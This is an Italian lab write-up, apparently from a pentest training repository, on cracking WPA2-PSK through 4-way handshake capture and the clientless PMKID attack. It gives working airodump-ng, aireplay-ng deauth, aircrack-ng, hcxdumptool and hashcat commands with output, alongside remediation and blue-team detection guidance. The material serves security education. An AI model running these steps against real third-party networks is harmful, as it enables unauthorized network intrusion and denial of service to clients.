> [English](README.en.md) | **Italiano**

# WPA/WPA2 cracking - handshake capture e PMKID attack

> - **Fase:** Wireless Security - Credential Access (802.11 PSK recovery)
> - **Visibilita:** Variabile - la cattura passiva dell'handshake e a bassa visibilita; il cracking offline e completamente invisibile (nessun pacchetto verso il target); la deautenticazione per forzare l'handshake e Attiva e rilevabile da un WIDS
> - **Prerequisiti:** Handshake 4-way completo o PMKID catturati (vedere `../recon-monitor/`); wordlist adeguate (modulo 04-system-exploitation/05-password-cracking/wordlists); GPU per hashcat (accelerazione essenziale su WPA2)
> - **Output:** WIFI-002, WIFI-003; PSK in chiaro recuperata; accesso completo alla rete WiFi target come client legittimo; base per lateral movement verso la rete interna

- **Ambiente Operativo:** Kali Linux (Attaccante), GPU NVIDIA per hashcat, rete WPA2-PSK di laboratorio
- **Target:** AP `LAB-CORP` (BSSID `AA:BB:CC:DD:EE:FF`), PSK debole di test
- **Tool principali:** aircrack-ng, hcxdumptool, hcxtools, hashcat

---

## Executive summary

Il cracking WPA/WPA2-PSK e l'attacco che trasforma la ricognizione radio in accesso effettivo alla rete. A differenza del WEP (rotto crittograficamente e crackabile in minuti indipendentemente dalla password), WPA2 e crittograficamente solido: l'unico vettore e l'attacco a dizionario offline contro il materiale di autenticazione catturato. La sicurezza della rete si riduce quindi interamente alla robustezza della Pre-Shared Key.

Esistono due percorsi per ottenere il materiale da craccare. Il primo, classico, cattura il 4-way handshake che avviene quando un client si autentica all'AP (WIFI-002). Il secondo, moderno (2018+), sfrutta il PMKID presente nel primo messaggio dell'handshake e non richiede alcun client connesso: e l'attacco clientless (WIFI-003), significativamente piu efficiente perche elimina l'attesa di un'autenticazione o la necessita di deautenticare un client.

Entrambi i percorsi convergono su hashcat, dove la robustezza della PSK determina la fattibilita: una password di 8 cifre numeriche cade in minuti, una passphrase di 20 caratteri alfanumerici e computazionalmente irraggiungibile con un attacco a dizionario.

---

## Struttura della cartella

```
cracking/
+-- README.md      # questo file: handshake WPA2 (WIFI-002) + PMKID clientless (WIFI-003)
+-- img/           # screenshot cattura handshake e output hashcat
```

---

## Attacco 1: 4-Way handshake capture & crack

**ID Finding:** `WIFI-002` | **Severity:** `Alto` (PSK WPA2 recuperata - accesso completo alla rete come client legittimo)

### Contesto operativo

Il 4-way handshake e lo scambio di quattro messaggi EAPOL con cui client e AP derivano e confermano le chiavi di sessione a partire dalla PSK. Catturando questo scambio si ottiene tutto il materiale necessario per un attacco a dizionario offline: non si "decifra" il traffico, si verifica offline quale password produce lo stesso MIC (Message Integrity Code) osservato nell'handshake.

### PoC - fase 1: cattura dell'handshake

```Bash
# Ascolto mirato sul canale del target, salvataggio su file
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w handshake_lab wlan0mon

# In un secondo terminale: deautenticazione per forzare la riassociazione di un client
sudo aireplay-ng --deauth 3 -a AA:BB:CC:DD:EE:FF -c A0:B1:C2:D3:E4:F5 wlan0mon
```

```
 CH  6 ][ Elapsed: 48 s ][ 2026-05-12 15:10 ][ WPA handshake: AA:BB:CC:DD:EE:FF   <-- handshake catturato

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC  CIPHER AUTH ESSID
 AA:BB:CC:DD:EE:FF  -41 100      620       88    2   6  270   WPA2 CCMP   PSK LAB-CORP
```

L'indicazione `WPA handshake: AA:BB:CC:DD:EE:FF` nell'header conferma la cattura riuscita del 4-way handshake completo.

### PoC - fase 2: cracking con aircrack-ng

```Bash
# Attacco a dizionario diretto (CPU)
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake_lab-01.cap
```

```
                               Aircrack-ng 1.7

      [00:03:41] 1857420/14344391 keys tested (8420.15 k/s)

      KEY FOUND! [ Password123! ]                          <-- PSK recuperata (WIFI-002)

      Master Key     : CD 69 0D 11 8E AC ... 8F 2A
      Transient Key  : 33 55 0B FC 4F 24 ... A1 9C
      EAPOL HMAC     : 9E C5 8A 21 7B ... 4D
```

### PoC - fase 3: cracking accelerato con hashcat (GPU)

```Bash
# Conversione al formato hashcat 22000 (nuovo standard unificato)
hcxpcapngtool -o hash_lab.22000 handshake_lab-01.cap

# Attacco GPU con wordlist + regole
hashcat -m 22000 hash_lab.22000 /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

```
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Speed.#1.........:   412.5 kH/s (GPU)                      <-- 50x rispetto alla CPU
Recovered........: 1/1 (100.00%) Digests
```

### Remediation WIFI-002

- **Azione immediata:** sostituire la PSK con una passphrase di almeno 15 caratteri ad alta entropia (mix di maiuscole, minuscole, numeri, simboli), non presente in wordlist pubbliche; l'attacco a dizionario diventa computazionalmente inefficace
- **Azione strutturale:** migrare a WPA2/WPA3-Enterprise (802.1X con RADIUS) che elimina la PSK condivisa e autentica ogni utente individualmente; abilitare WPA3-SAE dove supportato (Simultaneous Authentication of Equals) che rende impossibile l'attacco a dizionario offline anche con handshake catturato
- **Verifica:** audit periodico della PSK contro le wordlist note; monitoraggio WIDS per pattern di deauth flood che precedono la cattura dell'handshake

---

## Attacco 2: PMKID clientless attack

**ID Finding:** `WIFI-003` | **Severity:** `Alto` (PSK recuperata senza client connessi - attacco clientless piu efficiente)

### Contesto operativo

L'attacco PMKID (scoperto da Jens Steube di hashcat nel 2018) sfrutta un campo opzionale presente nel primo messaggio EAPOL dell'handshake, inviato dall'AP stesso. Poiche il PMKID e derivato dalla PMK (che dipende dalla PSK) ma viene trasmesso dall'AP senza bisogno di un client autenticato, e sufficiente una singola richiesta di associazione per ottenerlo. Questo elimina la necessita di attendere o forzare l'autenticazione di un client legittimo - il punto debole del metodo classico.

### PoC - cattura ed estrazione del PMKID

```Bash
# Cattura clientless mirata con hcxdumptool
sudo hcxdumptool -i wlan0mon -o pmkid_lab.pcapng --enable_status=1 --filterlist_ap=AA:BB:CC:DD:EE:FF --filtermode=2
```

```
[15:40:12] AA:BB:CC:DD:EE:FF  LAB-CORP  [FOUND PMKID CLIENT-LESS]   <-- PMKID catturato senza client
```

```Bash
# Estrazione e conversione al formato hashcat 22000
hcxpcapngtool -o pmkid_lab.22000 pmkid_lab.pcapng

# Cracking GPU (stesso modulo -m 22000, hashcat distingue PMKID ed EAPOL)
hashcat -m 22000 pmkid_lab.22000 /usr/share/wordlists/rockyou.txt
```

```
AA...FF*LAB-CORP:Password123!                              <-- PSK recuperata via PMKID (WIFI-003)
Status...........: Cracked
```

### Remediation WIFI-003

- **Azione immediata:** la mitigazione e identica a WIFI-002 (PSK robusta), perche il PMKID e vulnerabile solo se la PSK e debole. In aggiunta, alcuni AP permettono di disabilitare la trasmissione del PMKID (opzione "PMKID caching" / roaming 802.11r): disabilitarla se il fast roaming non e necessario
- **Azione strutturale:** WPA3-SAE elimina completamente il vettore PMKID; su reti enterprise, 802.1X non usa una PSK e quindi non e attaccabile per PMKID
- **Verifica:** verificare con `hcxdumptool` in ambiente controllato se il proprio AP espone il PMKID; testare la PSK contro wordlist estese

---

## Esperienza di laboratorio

Il primo ostacolo pratico e stato la cattura dell'handshake completo. Nel laboratorio, l'unico client (`A0:B1:C2:D3:E4:F5`) era gia associato e stabile: airodump-ng poteva restare in ascolto per ore senza catturare nulla, perche l'handshake avviene solo al momento dell'associazione. La deautenticazione mirata ha risolto il problema forzando la riassociazione, ma ha evidenziato una lezione operativa: il deauth genera traffico rilevabile, e in un contesto con WIDS attivo questo passaggio e il momento di massima esposizione.

Il passaggio a hcxdumptool per l'attacco PMKID ha cambiato completamente l'economia dell'attacco. Senza dover attendere o disturbare alcun client, il PMKID e stato ottenuto in meno di dieci secondi da una singola Association Request forgiata. Questo spiega perche il PMKID e diventato il metodo preferito nei penetration test wireless moderni: e piu veloce, piu silenzioso (nessun deauth verso client legittimi) e ugualmente efficace.

Il fattore decisivo in entrambi i casi non e stato lo strumento ma la wordlist. La PSK di test (`Password123!`) e presente in rockyou.txt ed e caduta in pochi minuti. Ripetendo l'esercizio con una passphrase generata casualmente di 18 caratteri, nessuno dei due attacchi ha prodotto risultati in tempi ragionevoli - la conferma pratica che WPA2 e sicuro esattamente quanto lo e la sua password.

---

## Analisi teorica: PBKDF2 e il costo del cracking

WPA2-PSK deriva la Pairwise Master Key (PMK) dalla passphrase tramite PBKDF2-HMAC-SHA1 con 4096 iterazioni e l'SSID come salt: `PMK = PBKDF2(passphrase, SSID, 4096, 256)`. Le 4096 iterazioni sono una scelta di design deliberata (key stretching): rendono deliberatamente costoso il calcolo di ogni singolo candidato, rallentando l'attacco a dizionario.

Questo ha due conseguenze pratiche. Primo, l'uso dell'SSID come salt significa che le rainbow table sono possibili solo per SSID comuni ("linksys", "NETGEAR"): per SSID unici l'attacco deve calcolare la PMK da zero per ogni password. Secondo, il cracking WPA2 e intrinsecamente lento rispetto ad altri hash - le poche centinaia di kH/s su GPU (contro i miliardi di H/s per un MD5) derivano proprio dalle 4096 iterazioni PBKDF2.

WPA3-SAE (Dragonfly handshake) risolve alla radice il problema: sostituisce lo scambio PSK con un protocollo di key agreement basato su curve ellittiche che fornisce forward secrecy e - fondamentale - resistenza agli attacchi offline. Anche catturando l'intero scambio SAE, un attaccante non ottiene materiale attaccabile a dizionario, perche il protocollo richiede un'interazione online per ogni tentativo (rendendo il brute-force rilevabile e rate-limitabile lato AP).

---

## Scenario reale: proiezione Post-Exploitation

> Questa sezione descrive come questo finding si inserirebbe in un engagement reale, sia dal punto di vista dell'attaccante (Red Team) che del difensore (Blue Team).

### Prospettiva attaccante (red team)

**Punto di partenza:** PSK WPA2 recuperata, accesso alla rete WiFi target come client legittimo (WIFI-002/WIFI-003).

**Passo successivo immediato:** connessione alla rete e ricognizione interna - l'attaccante e ora sul segmento di rete interno, spesso oltre il perimetro firewall.

**Kill Chain proiettata:**

```
[WIFI-002/003] Accesso WiFi come client legittimo
        |
        v
Network scan interno (nmap) -> host, servizi, share SMB esposti
        |
        v
Lateral movement -> credential harvesting (Responder, NetExec)
        |
        v
Escalation su Active Directory -> Domain Admin
        |
        v
Esfiltrazione dati / persistenza / ransomware deployment
```

**Impatto potenziale:** l'accesso WiFi bypassa il perimetro fisico e il firewall di frontiera. In molte organizzazioni la rete WiFi aziendale ha visibilita diretta sui server interni: una PSK debole condivisa e nota a decine di dipendenti (ed ex dipendenti) diventa il punto di ingresso piu economico verso l'intera infrastruttura. Il collegamento diretto e con `07-post-exploitation/` (lateral movement) e `02-vulnerability-assessment/` (scansione interna).

### Prospettiva difensore (blue team)

**Rilevamento:** un WIDS/WIPS rileva i deauth flood che precedono la cattura dell'handshake (Event: deauthentication storm). Il cracking offline e invece invisibile: non genera alcun traffico. Il primo segnale rilevabile lato difesa e l'associazione anomala di un nuovo device MAC alla rete.

**Indicatori di Compromissione (IOC):**
- Burst di frame di deautenticazione (deauth code 7) verso client legittimi
- Association Request ripetute da MAC sconosciuti (pattern hcxdumptool)
- Nuovo device sulla rete WiFi con MAC non presente nell'inventario asset
- Traffico di scansione interna (nmap) originato da un IP del pool WiFi

**Contenimento:** rotazione immediata della PSK; isolamento del segmento WiFi dalla rete server (VLAN dedicata + firewall); MAC filtering come misura temporanea (non risolutiva, il MAC e spoofabile).

**Eradicazione e hardening:**
- Migrazione a WPA2/WPA3-Enterprise (802.1X): ogni utente ha credenziali individuali, revocabili singolarmente
- Segmentazione: la VLAN WiFi non deve avere accesso diretto ai server; instradare tutto tramite firewall con policy esplicite
- PMF obbligatori (802.11w) per impedire i deauth forgiati
- Deploy di un WIPS che risponda attivamente ai rogue AP e ai deauth flood

**Lezione difensiva:** una PSK condivisa e un segreto statico noto a troppe persone. Il modello Enterprise (802.1X) sposta l'autenticazione da "cosa la rete conosce" (una password condivisa) a "chi sei tu" (credenziali individuali), rendendo la revoca e l'audit possibili.

---

## Tool di riferimento

| tool | tipo | tecnica/accesso | caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `airodump-ng` | wireless sniffer | cli | cattura del 4-way handshake su canale mirato |
| `aireplay-ng` | frame injector | cli | deautenticazione per forzare la riassociazione e l'handshake |
| `aircrack-ng` | wpa cracker (cpu) | cli | cracking a dizionario diretto su .cap (cpu-bound) |
| `hcxdumptool` | clientless capture | cli | cattura pmkid senza client connessi (attacco moderno) |
| `hcxtools` | format converter | cli | conversione .pcapng al formato hashcat 22000 |
| `hashcat` | gpu cracker | cli | cracking accelerato gpu con regole (modalita 22000) |
| `Wifite2` | attack automator | cli | automazione dell'intero flusso capture+crack (vedere `../automated-attacks/`) |

> **Tool moderno consigliato:** il formato `22000` di hashcat (WPA-PBKDF2-PMKID+EAPOL) ha unificato dal 2019 i vecchi formati 2500 (handshake) e 16800 (PMKID). Usare sempre `hcxpcapngtool` per la conversione e `hashcat -m 22000`: la modalita gestisce automaticamente sia PMKID che handshake nello stesso file hash.

---

## Mappatura MITRE ATT&CK

| tattica | tecnica | id mitre | descrizione dell'azione |
| :--- | :--- | :--- | :--- |
| credential access | network sniffing | `T1040` | cattura passiva del 4-way handshake eapol e del pmkid dai frame 802.11 (WIFI-002, WIFI-003) |
| collection | adversary-in-the-middle | `T1557` | deautenticazione di un client per forzare la riassociazione e catturare l'handshake (WIFI-002) |
| credential access | brute force: password cracking | `T1110.002` | attacco a dizionario offline su handshake/pmkid con aircrack-ng e hashcat (WIFI-002, WIFI-003) |
| initial access | valid accounts | `T1078` | utilizzo della psk recuperata per accedere alla rete wifi come client legittimo |

---

> **Nota:** Tutte le attivita documentate sono state condotte su una rete WiFi di laboratorio di proprieta dell'autore, con PSK di test note. La cattura di handshake, l'invio di frame di deautenticazione e il cracking sono stati eseguiti esclusivamente contro AP di test. L'accesso non autorizzato a reti WiFi di terzi costituisce reato. Le tecniche sono documentate a scopo educativo e di security assessment autorizzato.
